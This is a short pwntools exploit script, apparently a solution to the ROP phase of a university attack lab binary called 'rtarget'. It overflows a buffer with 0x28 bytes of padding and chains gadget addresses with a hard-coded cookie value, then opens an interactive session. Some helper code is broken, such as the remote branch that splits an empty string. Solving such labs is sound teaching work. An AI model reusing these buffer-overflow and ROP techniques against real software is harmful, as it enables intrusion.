#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
context.log_level = 'debug'
s       = lambda x                  :orda.send(str(x))
sa      = lambda x, y                 :orda.sendafter(str(x),str(y)) 
sl      = lambda x                   :orda.sendline(str(x)) 
sla     = lambda x, y                 :orda.sendlineafter(str(x), str(y)) 
r       = lambda numb=4096          :orda.recv(numb)
rc        = lambda                     :orda.recvall()
ru      = lambda x, drop=True          :orda.recvuntil(x, drop)
rr        = lambda x                    :orda.recvrepeat(x)
irt     = lambda                    :orda.interactive()
uu32    = lambda x   :u32(x.ljust(4, '\x00'))
uu64    = lambda x   :u64(x.ljust(8, '\x00'))
db        = lambda    :raw_input()
def getbase_b64(t):
    pid=proc.pidof(s)[0]
    pie_pwd ='/proc/'+str(pid)+'/maps'
    f_pie=open(pie_pwd)
    return f_pie.read()[:12]
if len(sys.argv) > 1:
    s = ""
    host = s.split(":")[0]
    port = int(s.split(":")[1])
    orda = remote(host,port)
else:
    orda = process(["./rtarget","-q"])
cookie = 0x59b997fa
#gdb.attach(orda,"b *0x4017B4")
raw_input()
#padding+0x0000000000401a06 + 0x0000000000401bab+p64(0x6166373939623935)+p64(0)+p64(0)+
payload = 'a'*0x28+p64(0x0000000000401a06)+p64(0x00000000004019d8)+p64(0x00000000004019a2)+p64(0x4018FA)+'\x00'*(33-2)+p64(0x6166373939623935)
ru("\n")
sl(payload)
irt()
